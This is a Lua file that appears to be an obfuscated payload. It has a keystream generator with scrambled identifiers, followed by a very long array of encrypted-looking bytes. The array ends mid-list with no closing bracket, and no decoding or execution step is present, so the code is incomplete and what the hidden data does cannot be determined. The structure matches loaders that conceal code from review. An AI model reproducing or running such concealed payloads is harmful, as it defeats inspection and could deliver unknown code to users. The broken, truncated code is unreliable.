local _lcFOlsmSSg=function(_OpjOD1Lfy0T,_OMpnADC)
  local A,C,M=4194301,12345,2147483648
  local s=_OpjOD1Lfy0T%M
  local out={}
  for i=1,_OMpnADC do
    s=(s*A+C)%M
    out[i]=math.floor(s/256)%256
  end
  return out
end
local _omlYA1TMR={33,127,97,149,255,148,49,40,69,140,254,108,132,213,49,243,150,160,107,149,59,41,79,6,199,149,224,121,75,61,228,114,72,62,38,108,116,97,113,175,182,63,94,242,250,0,164,12,131,143,66,17,217,31,150,7,134,106,164,242,228,18,91,223,216,110,134,238,48,34,188,225,62,71,30,114,117,59,65,207,159,60,49,20,138,212,164,173,200,118,151,62,55,80,218,87,231,199,155,193,203,185,185,124,81,124,166,168,215,73,31,168,249,7,181,188,69,49,75,200,110,55,178,229,76,8,191,162,170,29,106,138,37,62,79,140,44,117,165,9,243,241,8,97,221,82,220,107,191,182,119,158,16,131,56,48,252,38,83,241,9,157,239,231,101,127,145,24,148,168,192,160,253,193,123,32,140,31,133,230,14,129,225,49,225,9,41,81,18,128,155,51,112,147,203,171,200,122,130,66,4,226,18,147,19,233,74,15,142,19,32,67,159,238,151,233,202,16,30,200,119,141,80,13,187,196,173,229,51,89,238,45,93,220,97,208,115,155,37,123,114,157,36,154,21,179,224,88,218,102,198,244,246,2,240,37,117,140,37,128,64,27,41,123,87,205,138,42,76,11,152,8,188,150,59,61,236,40,25,194,102,146,43,243,231,246,131,75,146,247,108,221,21,39,116,132,77,218,60,39,28,160,250,160,118,93,201,90,77,239,8,122,250,223,252,215,130,49,134,103,181,205,148,27,103,154,222,106,133,82,128,65,231,178,193,49,24,9,6,153,155,22,156,4,181,171,217,5,229,45,7,64,253,230,1,88,207,103,92,83,209,45,66,57,67,218,41,85,213,110,196,182,212,120,146,34,121,163,25,172,239,43,81,223,54,70,54,77,27,121,79,226,17,155,3,224,97,223,115,174,229,40,100,213,133,131,129,110,135,61,30,141,90,221,69,234,36,114,99,150,210,120,44,209,1,160,159,221,12,35,99,219,91,178,204,17,141,4,88,204,16,124,222,136,20,42,106,161,244,228,30,127,20,184,177,122,230,11,188,127,222,60,32,50,211,82,139,24,155,15,140,24,74,23,146,70,8,179,218,75,7,132,98,115,34,43,162,72,14,205,61,24,129,125,113,126,133,113,160,185,194,124,110,42,65,232,173,205,13,134,193,221,22,37,120,118,118,93,180,191,83,251,233,210,222,36,115,91,75,246,242,189,48,58,233,16,243,45,101,100,41,250,181,95,158,203,229,68,255,223,201,253,195,153,18,131,53,244,17,145,48,181,237,177,183,95,64,11,228,75,228,18,166,166,48,216,74,254,147,22,183,212,80,203,36,152,243,229,171,163,127,77,120,70,179,83,83,40,89,234,52,86,226,81,6,221,78,12,208,121,121,142,85,247,254,251,6,227,59,72,39,137,74,27,175,69,1,223,85,248,10,198,152,9,151,243,7,200,96,157,186,191,138,108,131,4,170,103,33,198,122,150,51,42,63,28,67,90,91,192,158,179,183,214,118,106,127,9,235,248,212,223,6,84,206,248,201,43,236,136,137,54,85,250,4,215,111,162,0,249,249,12,215,114,141,81,13,201,144,86,225,81,1,224,74,6,230,74,13,190,190,197,241,254,232,57,73,30,138,79,230,1,180,198,142,16,142,231,56,16,185,208,76,114,42,36,217,87,199,175,231,14,149,28,68,88,97,174,211,19,149,59,72,245,222,236,65,246,219,200,73,140,37,240,224,230,188,23,221,58,69,38,124,110,172,251,252,240,36,146,72,12,211,133,93,205,138,90,246,0,244,36,145,49,97,222,104,172,242,41,120,124,129,124,124,111,167,7,242,14,201,164,20,168,254,4,223,72,32,163,14,185,203,154,31,136,93,229,76,0,243,37,226,42,103,193,176,218,86,234,20,118,87,221,71,229,16,99,195,121,165,246,112,242,109,66,247,132,75,245,166,7,147,18,207,135,47,50,69,200,202,9,181,189,85,210,133,105,146,8,110,186,139,27,8,138,199,117,1,171,131,228,159,67,7,228,85,233,73,22,166,20,190,173,249,5,214,115,151,34,161,30,141,92,58,35,124,129,115,167,237,35,106,118,87,219,76,213,63,213,111,108,135,22,163,171,212,17,77,50,52,105,187,146,7,197,72,75,135,61,37,28,124,134,103,152,244,169,11,154,239,141,250,119,101,50,24,61,181,45,153,6,229,70,27,145,56,60,66,58,86,228,76,26,180,201,159,37,143,55,81,2,227,60,68,50,107,162,20,195,165,246,24,186,203,131,110,178,218,87,243,37,141,60,67,53,179,185,184,201,160,38,115,147,26,102,36,76,254,227,15,145,223,81,196,117,45,46,126,253,198,224,121,70,233,15,215,104,140,63,133,122,8,178,110,31,167,141,54,22,123,81,153,10,174,245,239,194,115,137,67,240,238,202,145,233,212,130,92,110,111,62,40,39,31,111,183,224,99,195,167,237,47,82,190,129,20,246,179,162,247,237,170,240,246,124,91,195,141,219,116,95,161,118,64,166,216,218,34,31,16,27,208,97,207,138,102,176,229,77,3,220,99,211,114,143,74,35,143,53,84,2,248,252,0,252,7,206,138,98,217,88,236,61,74,6,223,91,245,4,234,64,55,61,62,63,44,94,219,112,176,211,124,141,176,194,157,30,159,35,124,120,105,121,236,244,6,206,80,206,40,117,53,210,53,181,119,62,204,12,166,19,208,57,193,108,105,114,122,163,226,96,196,73,230,26,171,236,242,30,205,119,110,113,127,107,182,210,128,105,185,200,123,69,13,228,96,238,66,40,95,183,201,176,249,32,172,246,239,9,184,158,48,97,207,150,20,129,234,240,222,20,147,91,186,216,93,127,67,1,246,10,152,46,156,8,189,133,69,22,177,228,79,4,2,239,5,168,227,92,233,25,138,74,247,243,5,235,17,163,232,14,224,82,252,15,167,198,119,75,117,88,217,84,187,140,238,35,80,235,26,178,184,116,153,37,23,135,113,184,131,229,0,174,165,0,196,176,225,57,82,181,171,4,247,22,184,202,42,62,178,151,233,242,26,121,150,57,24,26,101,140,217,63,72,42,126,128,115,47,47,223,18,122,65,63,46,56,67,0,210,52,46,122,126,63,0,92,143,184,162,124,60,208,252,87,27,135,122,227,40,107,180,220,97,192,173,206,81,121,69,224,14,209,105,156,14,173,217,247,230,82,253,201,98,191,176,121,82,119,74,209,58,83,255,231,14,150,183,167,17,207,144,75,19,81,201,17,123,61,247,27,165,244,231,11,142,231,8,207,133,239,253,13,144,35,127,126,134,121,138,76,243,0,249,20,214,133,87,205,109,117,12,138,17,123,126,64,23,123,6,187,147,216,68,56,90,239,46,105,77,213,237,232,245,208,131,53,35,91,187,172,119,103,209,129,62,3,219,91,120,85,110,101,127,48,98,152,250,216,67,18,120,48,84,197,115,34,101,214,53,60,77,16,205,142,81,228,38,122,148,58,84,6,216,75,243,226,197,95,146,249,3,188,205,147,50,83,218,61,1,200,173,237,252,203,134,91,119,88,101,128,46,37,144,60,33,105,178,129,97,159,228,208,92,241,229,32,118,147,72,43,126,125,101,168,253,7,240,57,73,248,234,24,162,33,138,102,138,205,71,217,35,150,44,109,177,188,164,165,231,58,252,214,131,122,143,76,13,97,152,163,197,97,140,89,213,72,27,52,46,122,147,67,47,102,87,182,73,211,52,17,206,133,69,32,124,26,164,13,169,169,209,146,1,202,117,136,101,218,119,138,58,43,127,143,85,245,242,252,225,66,53,74,26,111,32,78,197,97,225,73,216,236,7,240,29,98,150,152,219,212,76,124,59,212,241,122,178,185,203,154,31,135,95,218,93,205,141,87,249,247,16,207,145,48,100,208,208,97,193,183,236,62,43,108,144,13,164,197,8,159,4,211,65,251,160,13,109,12,60,233,239,159,201,26,73,83,11,76,12,134,57,90,230,18,136,67,207,183,67,7,200,51,53,92,229,28,105,75,37,74,224,187,113,19,145,172,171,133,222,179,8,185,203,158,38,115,162,20,168,2,242,13,205,134,83,0,1,254,233,55,69,20,187,195,154,45,120,123,134,102,186,213,99,201,225,47,94,241,27,149,48,68,232,0,226,56,16,143,230,59,229,208,104,50,6,175,160,140,243,15,65,118,251,88,196,186,219,26,32,79,192,109,173,193,146,33,26,126,140,72,226,23,22,98,65,6,78,196,57,195,4,21,144,71,51,98,189,191,195,184,188,199,180,211,105,188,215,128,98,211,147,75,1,245,37,128,99,207,149,43,100,206,163,23,159,25,180,209,113,165,28,164,246,22,198,158,10,217,124,137,73,26,175,242,14,206,159,36,118,151,72,45,93,227,101,215,94,218,111,175,214,117,169,1,225,85,6,216,91,225,85,1,223,90,253,8,203,153,65,57,57,79,27,159,5,233,77,88,200,139,87,6,230,50,88,205,85,109,104,118,75,32,139,52,21,139,100,139,47,76,22,187,163,241,28,129,85,223,100,165,228,41,104,189,178,221,37,253,182,140,10,222,80,4,202,123,12,166,18,129,90,249,13,174,207,136,102,216,109,189,189,191,179,188,163,240,42,123,96,182,155,156,220,27,93,232,38,66,179,178,240,58,16,133,76,31,154,5,202,147,26,137,61,63,50,62,29,124,65,21,182,208,100,173,231,33,118,126,134,64,22,144,6,201,160,17,163,245,28,128,88,206,136,79,228,41,87,176,190,152,34,155,55,100,201,149,23,148,68,60,90,240,26,133,68,7,203,141,64,47,70,228,44,113,161,12,212,138,62,29,157,32,168,12,211,88,206,106,121,110,179,229,86,13,213,95,189,198,171,252,4,224,50,51,113,126,68,161,203,78,197,170,215,81,26,88,195,187,215,57,66,244,226,180,135,210,84,101,127,8,86,75,65,16,211,135,85,9,223,78,32,154,26,183,212,109,193,181,201,174,68,4,215,112,167,7,206,129,81,222,84,190,131,210,44,226,36,245,208,21,45,196,214,79,8,229,58,53,88,251,250,245,24,193,195,154,40,141,81,242,30,156,31,135,99,213,106,165,7,235,46,90,233,69,119,107,164,9,215,111,152,37,102,160,12,150,251,106,101,56,33,252,187,83,115,244,69,3,249,21,166,9,232,47,114,163,253,3,237,31,156,29,143,84,83,217,94,240,55,64,45,79,228,64,249,210,229,244,137,45,217,37,22,42,206,184,167,2,1,252,241,38,148,59,49,100,213,117,132,107,192,181,198,166,14,23,141,64,63,53,69,27,134,65,41,63,1,86,161,131,63,163,198,50,215,198,208,97,207,138,90,214,111,164,1,223,84,242,20,168,250,255,237,36,167,18,181,236,53,75,46,115,139,80,4,242,12,205,144,78,250,2,233,130,76,254,242,13,197,134,63,49,39,71,132,22,35,95,67,230,210,247,105,231,28,163,21,198,147,62,69,47,87,242,36,128,100,200,158,37,118,150,61,73,8,223,92,218,87,241,44,211,89,216,109,180,214,98,196,137,55,72,226,22,23,93,80,216,215,42,7,88,68,86,210,140,80,248,28,163,255,8,226,67,59,69,25,186,198,151,61,141,41,105,185,207,153,24,162,239,6,219,40,70,138,6,85,201,5,161,164,130,197,210,91,228,71,40,109,174,239,46,91,230,72,34,127,121,137,79,246,20,185,195,156,34,146,72,12,207,134,107,163,13,209,201,119,125,123,135,112,147,50,62,24,166,200,102,40,42,231,21,34,74,169,115,243,73,251,24,173,227,97,209,119,164,1,231,81,255,237,70,41,108,190,191,174,1,251,250,26,166,249,36,231,29,142,78,20,200,140,70,4,198,155,235,253,99,123,246,230,174,166,146,184,36,180,186,217,106,169,10,232,50,117,165,251,22,10,178,207,145,79,247,8,190,153,33,87,184,51,11,70,247,123,61,206,4,65,94,181,213,130,123,114,160,31,161,1,244,35,140,62,58,84,9,199,158,26,164,246,19,196,169,232,62,68,36,121,138,93,224,68,41,135,187,161,1,247,13,187,184,173,203,141,19,133,204,63,170,202,2,170,136,214,201,197,130,116,171,237,30,159,38,126,105,188,207,215,75,1,247,38,122,117,142,31,174,199,104,51,20,115,85,251,227,27,170,173,197,182,218,82,222,5,174,190,117,92,205,80,205,120,50,118,115,163,242,244,24,146,53,2,200,91,92,156,219,28,163,230,207,142,62,54,7,160,46,83,245,235,21,153,178,217,52,63,189,201,143,18,128,64,8,189,159,159,19,134,73,160,24,149,45,67,13,176,117,167,158,164,238,160,188,142,2,101,106,171,110,242,136,192,223,43,83,221,239,6,184,217,102,153,1,149,64,41,87,249,20,182,118,147,20,162,127,238,229,0,175,237,27,142,16,143,231,57,233,178,144,156,83,212,124,103,54,203,21,30,0,141,36,152,37,37,226,187,106,108,42,41,253,161,75,33,8,215,62,108,27,37,251,108,26,114,112,144,17,83,31,140,25,106,131,65,18,160,164,24,75,157,4,95,125,76,202,15,106,169,114,227,180,59,110,127,87,209,19,152,234,174,164,193,107,181,177,218,23,169,188,175,227,40,243,167,103,123,43,56,234,21,174,186,188,78,162,159,254,229,50,91,164,10,186,107,182,184,185,145,41,124,59,84,152,182,182,71,198,113,88,99,111,155,157,99,53,184,250,231,33,169,182,167,253,211,13,69,223,16,125,56,7,152,230,68,3,118,144,12,161,8,148,227,26,154,180,113,53,61,38,110,167,0,102,217,90,247,24,152,14,105,179,165,236,183,222,106,204,128,5,251,202,102,185,129,28,112,154,179,113,51,65,26,147,55,77,136,50,54,127,137,104,203,168,236,192,197,105,158,0,255,210,36,137,85,195,87,191,172,126,16,85,219,77,250,3,233,178,179,234,52,46,65,214,106,121,110,143,84,213,30,155,29,107,94,170,235,193,73,173,214,94,199,155,35,252,215,130,109,116,107,171,170,160,228,60,206,33,34,117,127,98,202,148,170,246,233,35,253,118,75,204,74,20,143,47,215,45,69,12,95,150,244,245,162,7,162,242,3,247,235,218,101,191,86,41,112,117,141,32,114,86,11,195,187,187,136,37,234,229,183,163,118,77,157,149,141,122,105,208,211,89,217,108,186,215,96,205,99,197,112,139,216,100,139,56,50,105,149,221,94,214,17,249,1,193,169,204,108,103,216,93,239,34,86,188,38,48,214,71,139,13,93,86,75,63,26,193,10,179,203,150,55,86,227,68,253,12,206,97,169,158,19,126,94,190,198,126,32,148,50,254,49,88,188,183,163,232,243,242,46,100,144,15,46,23,33,103,45,41,9,82,86,32,111,173,6,58,34,124,128,118,140,64,43,72,27,122,109,29,84,188,166,232,71,249,176,227,69,198,217,107,163,218,52,19,89,179,206,136,230,24,189,197,135,49,95,119,181,165,229,16,183,130,141,48,52,85,148,98,167,237,34,134,26,205,146,50,87,246,244,221,56,4,251,200,131,81,11,175,143,72,23,80,60,69,22,130,60,252,158,227,62,58,217,62,69,31,70,228,35,111,172,241,42,132,119,119,116,155,36,148,82,11,179,186,165,247,30,146,73,250,228,11,174,207,148,74,28,171,6,203,121,149,71,36,137,85,210,91,194,158,35,132,113,126,61,37,141,67,10,185,193,145,35,111,172,250,227,41,55,5,168,225,53,96,177,137,89,229,230,118,137,56,35,130,17,175,180,164,142,33,163,4,172,214,88,248,230,233,58,66,207,189,191,167,206,87,172,143,18,178,220,211,50,33,118,118,156,251,171,242,24,76,71,26,135,91,200,52,87,243,246,195,130,127,127,90,183,205,44,150,2,206,83,236,225,112,133,54,81,161,59,27,145,55,71,216,148,63,45,101,203,119,86,206,65,66,241,7,195,183,171,153,40,118,51,147,55,49,93,195,68,38,133,64,237,3,245,15,119,80,222,65,69,53,53,55,70,3,207,105,186,195,137,55,48,84,1,233,62,28,126,60,30,142,80,18,202,162,20,162,236,34,146,75,34,166,3,200,125,92,162,231,30,144,74,25,184,207,126,95,191,191,186,215,114,161,239,6,195,160,37,128,128,51,19,91,109,148,175,142,26,95,78,174,223,208,203,252,99,241,240,25,164,189,149,71,40,120,79,47,53,65,27,112,71,250,197,8,161,253,231,3,181,117,150,19,194,148,15,199,132,93,128,108,117,133,44,226,149,104,127,250,122,30,130,218,118,99,231,70,25,189,209,111,132,82,126,56,119,78,132,35,69,224,91,208,111,107,125,26,159,229,64,231,254,104,182,194,163,213,69,230,137,139,43,133,50,94,220,115,169,249,19,203,155,49,56,196,98,136,22,177,187,188,113,153,206,245,144,67,15,171,98,184,63,107,145,30,68,255,9,156,8,237,47,70,5,217,72,255,217,95,180,185,168,185,203,100,230,72,18,212,143,55,46,84,120,75,56,75,231,208,252,187,124,59,254,179,148,241,27,115,152,225,17,47,96,196,155,236,255,184,21,232,19,203,143,15,175,177,230,63,94,179,237,37,62,76,223,83,176,162,124,122,118,135,40,75,210,199,222,57,88,244,32,142,44,90,130,148,18,216,102,82,15,153,70,39,118,168,16,178,188,171,117,85,38,97,201,64,160,144,67,16,168,110,151,163,64,18,155,214,80,197,30,84,180,147,244,210,57,2,232,11,206,62,249,118,139,66,35,85,196,106,0,39,85,5,167,18,135,72,229,75,18,237,30,149,17,158,251,193,194,124,124,53,21,35,131,90,217,49,48,38,203,208,99,143,45,114,154,5,198,149,20,156,4,235,49,63,20,140,21,144,60,15,197,90,165,116,146,46,95,160,228,7,39,176,167,214,52,62,69,43,113,167,251,231,29,146,72,38,145,73,38,97,176,185,137,36,88,245,30,179,234,81,20,200,164,35,114,21,110,100,130,109,132,81,112,27,94,148,242,43,104,153,53,97,207,43,107,129,110,95,149,163,3,219,86,187,147,251,75,47,37,92,199,16,40,66,28,137,29,103,95,216,76,23,150,10,212,93,211,30,146,227,235,65,241,159,253,82,104,110,155,116,166,49,61,253,117,78,196,97,201,105,167,127,68,223,201,121,9,146,156,77,198,19,174,213,88,185,160,250,161,17,168,150,149,255,225,17,38,99,170,148,173,197,72,242,47,42,156,36,125,119,148,27,104,151,233,76,225,64,180,165,188,50,63,183,136,188,239,225,196,155,14,173,185,162,245,177,226,53,237,142,20,161,209,231,32,116,54,197,124,44,70,44,105,107,119,121,151,41,126,140,72,255,214,107,195,165,10,233,48,68,7,180,157,247,209,103,204,171,1,246,17,169,222,104,216,122,140,75,242,220,215,40,53,15,208,114,98,150,27,73,48,68,47,78,224,83,225,71,203,111,103,55,10,144,255,176,158,211,52,93,202,128,57,18,93,234,54,73,19,113,121,155,230,90,185,167,254,225,84,143,68,244,0,122,135,51,56,73,255,249,167,217,70,247,24,165,181,207,85,16,183,45,187,19,79,207,254,222,60,208,134,254,115,86,171,173,166,188,121,67,44,75,12,128,110,109,114,4,110,71,29,178,195,89,212,74,133,208,182,177,217,59,56,204,94,188,91,10,110,251,7,194,82,1,213,96,154,14,206,70,79,209,122,75,219,202,68,153,255,100,132,248,134,187,240,1,246,32,165,246,23,186,191,167,3,245,12,193,184,215,104,173,240,41,110,154,43,123,123,113,159,17,177,227,86,1,223,87,238,26,172,244,10,219,100,185,205,152,55,64,54,77,255,254,81,222,81,23,177,211,117,118,114,152,241,234,157,202,9,174,85,176,117,13,37,177,191,187,205,154,23,182,239,55,63,58,79,6,210,131,114,147,43,119,150,42,103,194,180,214,98,210,131,100,183,210,139,96,196,171,243,22,163,17,206,145,48,103,199,158,9,220,103,201,135,101,225,94,202,152,52,105,171,248,18,181,198,166,9,207,119,148,84,2,221,95,225,92,209,133,109,248,234,38,129,118,143,55,70,246,40,87,197,163,225,228,194,105,115,85,175,161,203,76,201,83,182,139,88,217,83,191,128,19,187,81,217,122,146,62,48,95,168,43,232,31,126,37,251,235,53,92,184,55,41,90,201,39,144,21,170,119,93,193,77,53,237,133,36,1,173,168,181,143,1,172,169,180,147,244,209,131,71,172,242,174,249,7,182,169,156,33,58,115,7,188,199,166,1,240,240,0,201,151,7,200,13,68,227,6,156,218,33,74,208,132,63,32,4,96,141,8,151,47,64,29,44,48,32,106,157,141,176,169,229,46,46,52,246,17,162,22,152,3,234,26,157,195,166,210,103,52,37,112,145,20,57,254,60,29,93,85,176,158,212,125,89,117,159,11,205,67,61,77,7,200,150,1,198,130,81,137,104,187,154,255,157,42,106,146,73,35,137,253,252,216,85,100,64,238,229,1,248,249,243,222,35,42,112,103,164,200,28,48,237,49,90,4,168,213,135,115,194,104,51,21,110,101,197,127,111,87,231,1,192,81,228,211,241,248,142,46,247,237,39,69,247,146,29,102,169,187,68,169,216,28,164,236,213,121,109,152,243,3,239,225,97,114,41,94,81,170,198,91,91,135,83,117,219,203,246,65,18,159,46,38,87,237,2,150,42,56,51,28,33,35,20,186,191,215,105,99,144,20,61,29,102,170,184,77,141,43,97,66,5,246,12,147,31,125,138,51,3,234,49,47,19,130,62,190,153,244,255,187,69,165,226,58,184,204,104,165,118,10,144,254,179,225,62,37,74,224,242,22,129,94,112,176,188,134,196,55,6,191,177,168,218,7,137,215,40,210,240,96,171,43,73,43,126,104,130,56,54,249,25,72,121,246,187,121,1,163,141,240,93,235,171,239,234,68,147,189,52,195,36,112,117,129,61,211,89,227,236,144,179,133,27,28,84,122,40,183,223,207,132,43,80,253,193,150,244,153,185,82,0,235,82,197,101,62,244,212,52,92,186,81,250,212,102,89,244,241,233,153,183,121,133,50,71,165,254,191,168,196,25,239,90,167,127,233,210,105,39,143,14,170,152,212,246,202,234,168,54,42,183,163,34,127,135,87,143,209,101,59,236,255,175,96,121,125,248,82,104,31,199,125,76,22,104,202,149,12,168,139,204,75,204,74,209,60,251,188,184,109,56,49,216,21,133,30,18,98,194,40,194,22,21,229,37,84,254,176,187,212,113,104,172,182,67,113,213,56,205,0,142,52,197,182,151,12,114,72,154,223,171,101,255,206,204,79,127,49,28,90,159,210,58,2,249,245,217,51,71,198,202,167,248,246,12,160,234,22,148,204,111,161,178,105,159,141,244,230,249,129,21,170,113,232,165,104,230,22,146,34,35,104,182,153,8,124,42,246,203,232,175,33,104,254,185,66,232,246,203,147,19,164,122,68,255,224,195,12,147,40,103,132,48,1,234,215,229,20,181,180,139,209,106,118,224,121,98,224,104,136,56,106,141,95,159,13,211,125,127,108,177,224,50,60,97,168,15,143,56,74,25,175,229,93,229,65,72,214,54,62,37,74,223,247,10,168,26,133,211,112,126,73,220,8,193,147,192,4,192,199,181,160,239,67,2,0,183,174,222,98,211,130,114,131,82,6,233,68,46,71,255,212,83,27,121,155,234,30,115,122,124,145,78,12,213,94,187,187,213,131,111,172,207,101,166,239,39,114,144,90,161,213,99,181,154,240,195,165,199,118,26,247,170,227,254,103,33,7,89,136,11,178,215,50,69,11,178,123,113,102,44,19,169,137,241,255,240,232,251,118,131,254,118,92,177,128,97,162,76,231,79,215,135,112,151,44,120,148,21,128,114,159,36,131,124,130,114,125,82,23,174,230,49,196,110,152,21,121,82,157,21,121,119,138,61,211,76,114,9,24,131,241,36,146,225,40,141,79,216,55,53,247,62,173,201,131,3,197,172,246,235,250,152,62,0,189,36,53,199,117,1,173,126,243,114,204,109,174,235,37,138,83,236,56,74,7,236,66,30,162,22,164,11,200,140,89,246,4,245,32,135,102,192,166,5,223,71,33,147,46,120,153,29,167,252,242,42,123,115,165,20,169,2,241,17,198,240,0,228,77,37,144,51,80,226,12,51,32,129,93,163,213,18,189,158,32,123,90,229,42,108,83,244,222,75,255,10,191,254,38,184,147,118,109,107,42,47,32,78,24,162,234,66,59,66,209,121,75,247,244,34,106,93,220,90,134,153,31,102,185,156,253,159,213,76,249,122,232,1,222,69,232,5,130,109,141,84,223,47,102,167,245,186,192,83,106,109,164,4,178,124,95,77,252,7,174,253,164,169,240,163,145,144,210,78,201,18,119,72,214,120,121,115,96,156,189,183,146,33,68,127,191,16,70,48,96,86,200,174,228,10,163,163,203,165,135,39,188,229,1,200,163,117,105,138,73,218,60,59,31,51,212,49,27,93,228,52,67,240,236,205,133,55,80,157,212,139,53,53,51,71,245,92,184,222,84,187,165,183,37,204,233,186,211,120,16,192,126,99,82,247,210,98,127,206,211,211,253,11,207,35,186,60,36,114,75,136,68,42,124,88,87,203,117,118,31,168,195,116,253,171,102,150,158,213,6,93,55,126,92,231,48,104,188,175,238,60,51,97,29,123,114,163,34,156,17,184,170,183,72,213,47,34,147,41,99,142,19,89,225,241,126,212,229,252,133,64,16,174,181,92,196,125,9,176,246,12,160,20,80,187,215,82,222,56,56,34,214,110,117,124,5,221,45,109,71,214,131,78,236,15,179,176,68,88,116,107,217,122,75,219,201,70,147,16,48,30,43,238,131,152,10,218,111,176,211,124,126,105,182,202,133,97,198,174,216,99,188,196,181,229,53,91,237,36,122,138,70,36,138,71,38,145,149,18,173,234,51,90,213,109,139,41,115,101,173,115,148,9,218,253,178,241,3,203,114,139,41,207,162,171,188,178,219,237,55,71,207,142,55,47,239,160,206,68,226,85,226,55,20,131,11,205,93,230,208,199,172,223,47,219,194,55,211,83,11,203,85,227,72,5,125,78,107,29,219,56,210,129,124,63,102,55,49,73,196,28,136,95,221,55,187,159,247,242,173,254,192,126,223,5,88,193,30,85,134,218,191,229,34,146,78,18,174,237,64,56,59,73,51,101,179,223,112,181,195,174,249,4,215,115,179,238,27,169,14,206,122,140,106,193,161,19,198,244,247,5,252,15,182,200,124,64,172,172,171,172,246,0,221,34,87,140,73,232,41,221,216,59,155,145,96,173,255,239,233,38,125,101,92,176,70,141,138,44,246,22,190,121,183,68,10,190,103,53,60,66,52,48,206,101,168,223,228,90,174,180,61,234,167,211,231,249,155,156,119,187,159,22,187,206,121,138,101,207,119,146,83,10,197,169,5,220,78,11,219,97,191,186,210,117,132,107,195,180,200,158,46,121,121,137,93,50,60,52,106,200,141,69,4,167,119,73,211,53,90,210,104,129,57,230,59,20,186,79,87,128,36,38,111,42,78,27,101,215,16,34,231,170,172,116,114,120,119,90,109,145,22,63,50,41,97,88,229,21,191,70,101,210,109,133,218,198,45,239,34,89,210,3,229,230,159,111,18,118,22,140,44,92,172,119,116,108,60,23,222,108,170,199,167,140,144,79,248,228,187,34,25,59,92,126,68,27,161,155,29,104,165,139,77,211,68,141,252,115,113,15,131,252,122,221,137,53,86,248,108,140,62,55,77,12,191,176,195,127,128,109,93,161,36,42,213,205,250,190,62,19,151,27,113,42,93,179,103,187,142,50,230,60,15,183,52,211,73,113,14,232,55,25,145,199,151,207,228,162,123,58,203,110,134,76,219,234,26,123,15,158,73,43,107,130,92,69,163,218,189,43,157,55,237,247,2,235,187,189,135,71,167,249,206,84,96,131,220,52,195,101,86,106,15,244,243,26,171,63,19,170,252,20,174,220,90,196,126,132,97,130,103,134,42,220,13,62,14,54,13,95,80,93,11,176,229,148,21,169,6,226,61,53,21,46,36,67,231,77,3,200,167,10,212,28,152,209,34,134,224,217,184,91,171,202,197,181,205,95,217,242,110,60,241,191,165,136,87,185,176,107,173,178,167,100,118,3,192,33,76,161,138,175,20,148,58,69,29,142,73,19,178,208,133,100,208,116,153,37,133,85,246,29,155,19,194,198,159,8,220,90,220,78,15,223,96,196,175,3,70,255,229,67,45,102,176,219,57,83,243,204,138,28,105,32,65,163,225,189,121,26,31,238,88,201,157,51,106,165,10,235,61,43,118,167,14,184,207,156,41,104,192,206,153,23,175,235,44,97,215,128,107,161,22,202,165,244,28,177,229,54,88,1,71,253,236,50,112,176,212,115,91,159,238,19,42,217,45,89,211,63,255,149,52,58,78,241,250,7,196,156,195,164,205,140,53,188,128,13,76,116,195,135,32,13,135,25,98,212,102,173,177,169,150,42,70,13,66,14,112,90,3,48,58,86,234,251,243,4,251,236,118,190,240,233,114,121,72,147,245,209,60,67,7,108,169,203,126,238,8,131,31,177,36,95,5,247,8,163,213,220,15,56,33,254,182,100,64,139,129,78,11,223,175,198,146,66,67,51,75,12,164,21,179,179,177,132,116,141,42,129,125,122,41,115,97,154,141,251,117,107,32,79,152,164,95,5,196,175,61,25,154,41,114,143,64,9,216,68,16,51,212,52,20,115,157,248,153,36,90,208,247,238,210,50,122,203,105,230,82,248,211,69,140,255,105,142,182,140,225,202,239,85,210,124,127,199,123,114,159,26,182,195,165,219,112,163,227,34,50,107,167,220,108,187,194,82,247,212,66,149,228,188,150,158,214,2,102,25,214,79,12,43,79,249,24,186,181,206,96,210,85,221,205,7,155,223,18,201,143,37,145,76,15,108,186,181,184,85,178,182,186,54,182,151,28,140,21,125,27,157,223,46,31,129,31,123,60,220,90,121,239,153,201,114,176,175,228,68,19,127,100,178,163,213,18,183,117,41,99,140,201,117,100,15,159,41,59,37,136,100,167,225,70,3,205,113,164,8,185,135,34,122,112,103,137,247,7,161,246,249,38,119,2,82,146,251,127,111,4,192,197,133,220,90,235,226,92,95,184,180,74,2,185,97,231,119,84,228,50,35,85,148,48,38,103,131,243,126,13,163,138,58,88,228,63,50,239,253,14,170,108,168,2,157,44,240,7,198,19,167,202,45,121,162,210,108,155,231,8,121,129,24,65,32,132,46,17,197,92,97,178,210,206,98,223,53,205,136,100,120,154,166,229,47,218,80,207,30,165,26,9,158,6,203,86,188,95,209,34,243,138,174,72,173,198,103,151,65,71,212,239,225,10,143,36,207,181,173,255,213,230,54,64,45,48,102,235,17,193,165,217,224,165,44,75,238,10,203,150,57,92,229,68,16,163,255,250,12,226,87,236,14,167,223,72,33,135,100,166,198,135,102,218,112,167,253,231,34,148,80,16,197,160,243,252,223,25,131,76,5,240,58,79,25,163,245,243,16,207,154,47,125,114,124,93,190,167,249,253,245,247,214,233,243,212,50,75,155,175,94,5,188,209,95,75,7,204,137,27,164,51,58,69,24,126,240,116,192,144,43,114,127,95,215,78,236,17,179,185,169,216,46,78,20,207,144,61,38,103,201,174,244,27,129,83,218,40,97,217,129,130,140,97,185,172,248,35,157,50,91,194,141,47,46,226,9,148,243,7,102,78,129,175,216,69,56,42,232,47,84,241,228,72,69,3,235,38,84,111,248,52,50,57,39,113,164,16,214,117,162,241,6,229,77,34,144,54,49,64,19,174,248,5,242,252,195,149,75,19,156,2,224,53,58,44,115,147,25,139,51,30,132,125,126,139,85,253,225,47,96,232,61,83,21,181,180,182,179,163,130,40,54,13,188,60,161,166,88,194,190,152,158,12,190,180,156,32,191,150,49,85,201,15,24,213,79,226,54,102,219,118,150,67,16,164,255,12,230,80,19,186,165,228,39,114,176,223,104,153,235,26,173,231,31,126,126,92,197,139,90,233,24,142,40,63,18,159,12,216,129,131,104,185,178,191,171,250,23,174,246,26,133,66,15,183,212,110,172,208,76,135,26,97,139,51,172,83,59,25,186,162,128,103,172,234,250,6,12,174,234,44,68,159,104,227,37,107,185,210,147,63,69,13,178,229,77,35,161,15,166,226,43,52,54,69,42,131,108,198,176,205,107,165,11,225,81,1,239,6,195,138,25,142,80,254,219,72,27,130,80,236,56,42,85,214,59,188,123,62,243,246,83,66,119,229,188,23,135,112,130,226,67,25,162,209,130,152,10,212,107,134,218,182,249,227,48,110,191,201,170,7,201,126,132,124,134,96,212,87,208,98,143,47,119,132,71,4,227,43,85,219,111,169,215,80,227,13,181,231,68,53,99,173,204,136,115,185,221,89,199,126,90,175,96,141,6,155,17,73,162,142,189,29,198,121,153,6,84,236,30,148,251,3,21,146,60,53,40,242,112,205,104,160,28,